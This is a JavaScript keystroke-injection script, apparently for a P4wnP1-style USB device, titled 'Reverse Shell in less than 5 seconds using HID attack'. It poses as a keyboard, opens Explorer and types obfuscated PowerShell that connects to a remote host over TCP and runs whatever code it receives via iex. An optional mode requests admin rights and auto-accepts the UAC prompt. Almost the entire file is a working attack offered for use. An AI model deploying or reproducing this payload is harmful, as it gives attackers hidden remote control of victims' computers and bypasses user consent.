/*
Reverse Shell in less than 5 seconds using HID attack
author: TDiff
*/

// Use UAC prompt
adminMode = 0;

// Utils triggers
ledTrigger = 0;
UACTrigger = 0;
powershellTrigger = 0;

// Make sure we are ready to type
while (ledTrigger == 5) {
  	press("SCROLL");
    delay(50);
	if (waitLED(SCROLL, 50).SCROLL){
      	ledTrigger += 1;
    }
}
waitLED(SCROLL,10);
iDelay = 2000;

// Keyboard Settings
layout('fr');
typingSpeed(0,0);
delay(iDelay*2);

press("GUI m");
delay(50);
press("RIGHT_CTRL");
delay(50);
press("GUI m");

// Start the Reverse Shell script
StartReverseShell();

function StartReverseShell() {
  
    while (powershellTrigger == 0) {
		
		// Open an explorer so we can type commands
        press("GUI e");
        delay (iDelay);
        press("CTRL F4");
        press("CTRL A");
        delay(1000);

        if (adminMode){
            type("powershell -w 1 (New-Object -COM wscript.shell).SendKeys('{SCROLLLOCK}');");
            type("for($e='';$e-ne$null){saps powershell -A '-W 1',{sal n New-Object;(New-Object -COM wscript.shell).SendKeys('{SCROLLLOCK}');");
            type("for($w=n byte[] 7e4){for($u=(n Net.Sockets.TCPClient(17e7,8)).GetStream();($i=$u.Read($w,0,7e4))-ne0){");
            type("iex ([text.encoding]::UTF8.GetString($w,0,$i))}}catch{}}-Verb runAs -ErrorV e}\n")
        } else {
            type("powershell -W 1 ");
            type("sal n New-Object;(n -ComObject wscript.shell).SendKeys('{SCROLLLOCK}');for($w=n byte[] 7e4){");
            type("for($u=(New-Object Net.Sockets.TCPClient((17e7),8)).GetStream();($i=$u.Read($w,0,7e4))){");
            type("iex([text.encoding]::UTF8.GetString($w,0,$i))}}\n");
        }

        if (waitLED(SCROLL, 7000).SCROLL){
            powershellTrigger = 1; 
        }
    }

    if (adminMode) {
      	delay(iDelay);
      	press("LEFT");
      	delay(50);
      	press("ENTER");
        iFinalDelay = 100;
    	while(!waitLED(SCROLL, 7000).SCROLL) {
            iFinalDelay += 100;
            delay(iFinalDelay);
            press("LEFT");
      	    delay(50);
      	    press("ENTER");
        }
    }
}